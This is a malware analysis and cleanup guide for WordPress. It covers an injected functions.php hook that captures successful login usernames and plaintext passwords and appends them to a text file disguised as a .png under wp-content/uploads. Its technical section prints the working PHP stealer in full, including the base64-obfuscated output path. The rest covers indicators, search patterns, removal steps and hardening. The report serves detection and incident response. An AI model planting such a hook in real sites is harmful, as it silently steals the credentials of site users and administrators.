---
title: "WordPress functions.php Credential Stealer Malware Saving Logins as Fake PNG"
slug: "wp-theme-functions-credential-stealer-fake-png"
description: "A malicious WordPress functions.php injection can steal successful login usernames and passwords, then save them into wp-content/uploads as a fake .png file. Learn what to check and how to remove it safely."
reportDate: "2026-04-25"
reportType: "Threat Pattern"
threatType: "Credential Theft / Backdoor Persistence"
severity: "High"
sampleScope: "Representative infected theme file from a larger compromised WordPress site."
fileHash: "1370591525bf87bfff6b8f689e0d461e3e62cb3366cab1e71b50edfcac222d6a"
detectedPaths: ["functions.php"]
screenshots: ["/images/wordpress-threats/function.php-malware_evidence-1.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Not found / unique sample"
affectedComponents: ["Active or loaded WordPress theme functions.php file","wp-content/uploads/2024/06/ fake image file used as a credential log","Potentially other theme or plugin PHP files if this sample is representative of a broader compromise"]
entryPoints: ["Modified theme functions.php file acting as the execution point on each request where the theme loads","Stolen credentials file under wp-content/uploads/2024/06/ serving as attacker-accessible data storage"]
persistencePoints: ["Theme functions.php injection","Any sibling copies of the same malicious snippet in other theme files or alternate installed themes","Credential log file left in wp-content/uploads/2024/06/ under a deceptive .png name"]
---

## Quick Answer
If you found suspicious code in WordPress functions.php that hooks authenticate and writes login data to a fake image under uploads, treat the site as compromised and credentials as exposed. Remove the injected code by replacing the affected theme with a clean copy, delete the fake credential log file, check uploads and other PHP files for similar injections, and reset all potentially exposed passwords.

## What This Threat Pattern Is
This is WordPress credential-stealing malware embedded in a theme file. In the representative functions.php sample, the attacker added a callback to the authenticate filter at high priority. When a login succeeds and both username and password are present, the code appends username:password to a file stored under uploads. The destination filename ends in .png, but the code writes text, not image data. That makes the .png extension a disguise, not a legitimate media file.

## What Visitors May See
- Usually nothing obvious on the front end.
- The WordPress login page may appear to work normally while credentials are stolen silently.
- Administrators may later notice unauthorized logins, password resets, new users, or follow-on malware after stolen credentials are used.
- If reviewing files manually, you may see a suspicious comment such as 'WordPress session analytics' inside functions.php.

## Screenshot-Based Symptoms
The uploaded screenshot shows a theme functions.php file with highlighted PHP code that adds an authenticate filter and writes login data with file_put_contents to a base64-decoded path under wp-content/uploads. The same screenshot also shows the comment marker 'WordPress session analytics' above the injected code. This is not normal theme behavior. It is a credential-stealing login hook placed in a theme file so it runs during WordPress authentication.

### Screenshot Findings
- **File manager view open to a theme functions.php file with highlighted code showing add_filter('authenticate', function($u, $l, $p) { ... file_put_contents(ABSPATH.base64_decode(...)) ... }); and the comment 'WordPress session analytics'.** — The screenshot visually confirms a credential-stealing login hook inserted into a theme functions.php file rather than a normal theme feature.

## Why This Usually Means the Site Is Compromised
This WordPress infection pattern uses a malicious snippet inside a theme’s functions.php file to steal login credentials. In the representative sample, the code hooks WordPress authentication, captures successful usernames and plaintext passwords, and appends them to a file in wp-content/uploads/2024/06/ disguised with a .png filename. The login flow can still appear normal, so site owners often discover it only during a file review or after accounts are abused.

## Likely Root Cause
The original intrusion path is not proven by this sample alone. What is proven is that the theme’s functions.php file was modified with malicious code and that the code is designed to capture plaintext WordPress credentials. Common causes for this kind of modification include stolen admin or hosting credentials, vulnerable plugins or themes, or an existing backdoor that allowed file edits.

## Why It Keeps Coming Back
This infection can keep coming back if only the visible line in functions.php is removed while the wider compromise remains. The representative sample shows one execution point inside the active theme, but additional backdoors may exist in other theme files, plugins, uploads, mu-plugins, database options, or unused themes. Stolen credentials also create a reinfection risk: if attacker access is still valid, they can simply reinsert the same code after cleanup.

## Files and Directories to Check
- The affected theme’s functions.php file and the full theme directory
- wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png
- The surrounding uploads directory, especially wp-content/uploads/2024/06/
- Other installed themes, including inactive ones, for similar authenticate hooks
- Plugin PHP files for file_put_contents, base64_decode, or credential logging patterns
- Must-use plugins in wp-content/mu-plugins/
- wp-config.php and other core-adjacent writable files if broader compromise is suspected

## Removal Targets Inferred From The Samples
- **theme_file:** `functions.php` — Observed malicious authenticate hook appended to the theme functions file captures usernames and plaintext passwords.
- **file:** `wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png` — Decoded destination for stolen credential logging; likely contains captured usernames and passwords despite the .png extension.
- **theme_component:** `the affected theme directory containing the infected functions.php` — Representative sample indicates the theme component is compromised; review and replace the entire theme from a clean original copy rather than editing only one line.
- **directory:** `wp-content/uploads/2024/06/` — The credential log is stored here and similar disguised payloads or logs may exist nearby in the same uploads subdirectory.

## Technical Analysis
The representative infected functions.php sample contains a short but clearly malicious credential theft routine. It registers an anonymous callback on the WordPress authenticate filter with priority 999. Inside that callback, it checks that the authentication result is not a WP_Error and that both login and password variables are present. It then calls file_put_contents with FILE_APPEND to write the captured username and plaintext password in username:password format followed by a newline. The output path is built from ABSPATH plus a base64-decoded string. That string decodes to wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png. The use of @file_put_contents suppresses warnings, which reduces visible errors if the write fails. The .png extension is part of the disguise: the code writes text credentials, not image bytes. Because the code returns the original authentication result, the login proceeds normally and the theft is less likely to be noticed. Based on the sample alone, root cause remains unknown, but the behavior and persistence mechanism are clear and high confidence.

## Attack Chain
1. Attacker gains the ability to modify a theme file.
2. Malicious code is inserted into the theme’s functions.php file.
3. A user logs in through WordPress.
4. WordPress runs the authenticate filter during the login process.
5. The injected callback captures the username and plaintext password after a successful authentication result.
6. The stolen credentials are appended to a fake .png file under wp-content/uploads/2024/06/.
7. The login continues normally, reducing visible symptoms.
8. Captured credentials can then be used for follow-on access, reinfection, or privilege abuse.

## Evidence Notes
- Representative infected file provided as functions.php.txt and explicitly interpreted as functions.php.
- Observed code registers add_filter('authenticate', function($u, $l, $p) { ... }, 999, 3).
- Observed code writes login data using file_put_contents with FILE_APPEND.
- Observed output format is username:password followed by a newline.
- Observed path is obfuscated with base64_decode and resolves to wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png.
- Observed error suppression uses the @ operator on file_put_contents.
- Screenshot confirms the code is inside a theme functions.php file.
- Screenshot shows the marker comment 'WordPress session analytics'.
- Sample SHA-256: 1370591525bf87bfff6b8f689e0d461e3e62cb3366cab1e71b50edfcac222d6a.

## Representative Malware Samples
### FILE: `functions.php`
**Why it matters:** Malicious login hook that captures successful WordPress usernames and plaintext passwords and appends them to a disguised file in uploads.

```php
add_filter('authenticate', function($u, $l, $p) {
  if (!is_wp_error($u) && !empty($l) && !empty($p)) {
    @file_put_contents(ABSPATH . base64_decode('d3AtY29udGVudC91cGxvYWRzLzIwMjQvMDYvU3RhaW5lZF9IZWFydF9SZWQtNjAweDUwMC5wbmc='), $l . ':' . $p . PHP_EOL, FILE_APPEND);
  }
  return $u;
}, 999, 3);
```

## Indicators of Compromise (Public-Safe)
- `1370591525bf87bfff6b8f689e0d461e3e62cb3366cab1e71b50edfcac222d6a`
- `authenticate`
- `wp-content/uploads/2024/06/Stained_Heart_Red-600x500[.]png`
- `WordPress session analytics`

## Removal Strategy
Do not treat this as a harmless code oddity. The sample is a working credential stealer. Response should focus on containment, removal, and credential rotation, not just deleting one snippet.

## Manual Removal Protocol
1. Put the site in maintenance mode or otherwise limit administrator logins until containment is complete.
2. Make a forensic backup first if you may need to investigate scope later.
3. Replace the compromised theme with a known-clean copy from a trusted source instead of editing only the visible snippet out of functions.php.
4. Delete the fake credential log file at wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png after preserving a copy for investigation if needed.
5. Inspect the surrounding uploads folder for similar disguised files, especially image-named files that contain text or PHP.
6. Search the site codebase for the comment marker 'WordPress session analytics', for add_filter('authenticate', and for combinations such as file_put_contents plus base64_decode.
7. Review all installed themes and plugins, including inactive ones, for similar injections or backdoors.
8. Check WordPress users for unauthorized administrator accounts or suspicious password-reset activity.
9. Reset all potentially exposed credentials: WordPress users, hosting panel, SFTP/FTP, SSH, database, and any related admin accounts.
10. Invalidate active sessions where possible and rotate salts if your incident process calls for it.
11. Update WordPress core, themes, and plugins after cleanup, but do not use updating alone as a substitute for file integrity review.
12. Review server and access logs, if available, to see whether the fake .png file was requested over the web or whether attacker logins occurred after credential capture.

## Hardening Checklist
- Disable or tightly restrict direct file editing from the WordPress admin if your workflow allows it.
- Use strong unique passwords for all WordPress and hosting accounts and enforce MFA where possible.
- Remove unused themes and plugins so there are fewer writable places to hide code.
- Limit write permissions and review whether uploads directories are overly exposed.
- Use file integrity monitoring for theme and plugin directories.
- Audit administrator accounts regularly and remove stale users.
- Keep WordPress, themes, plugins, and server software patched.
- Review logs for repeated access to unusual files inside uploads, especially media-named files returning text content.

## FAQ
### Is this really malware if the site still works normally?
Yes. The representative code is designed to steal successful WordPress login credentials without breaking the login flow. A site can appear normal while accounts are being harvested.

### Why save credentials in a .png file?
To hide the data in a location and filename that looks like a normal uploaded image. In the sample, the file extension does not match the actual content being written.

### Does this mean all passwords entered on the site were stolen?
The code captures usernames and passwords when the authenticate hook receives a successful result and non-empty values. You should assume any WordPress credentials entered while the code was active may be exposed.

### Can I just delete the suspicious lines from functions.php?
That may stop this exact execution point, but it is not a complete cleanup strategy. Replace the whole affected theme with a known-clean copy and check for additional backdoors, fake files in uploads, and compromised credentials.

### What should I search for on the server?
Start with the affected theme’s functions.php, the decoded path wp-content/uploads/2024/06/Stained_Heart_Red-600x500.png, the comment marker 'WordPress session analytics', authenticate-hook injections, and suspicious use of file_put_contents, base64_decode, and FILE_APPEND in theme or plugin PHP files.

### Could the fake .png file be publicly accessible?
Possibly. The sample stores credentials under uploads, which is often web-accessible. This evidence does not prove accessibility on every site, so you should verify by checking server configuration and logs.

### What passwords need to be reset after this infection?
At minimum, reset all WordPress user passwords that may have been used during the exposure window. In a real incident, also reset hosting, SFTP/FTP, SSH, database, and any related administrator credentials because the original entry point may be broader than the visible snippet.

> **Proof statement:** Based on representative malware samples and screenshots collected during real WordPress cleanup work by MD Pabel, this pattern is a high-confidence WordPress credential stealer: the provided functions.php sample hooks authentication, captures successful usernames and plaintext passwords, and appends them to a disguised file under uploads.
>
> **Confidence:** Root cause low, persistence high, screenshot read high, IOCs high.
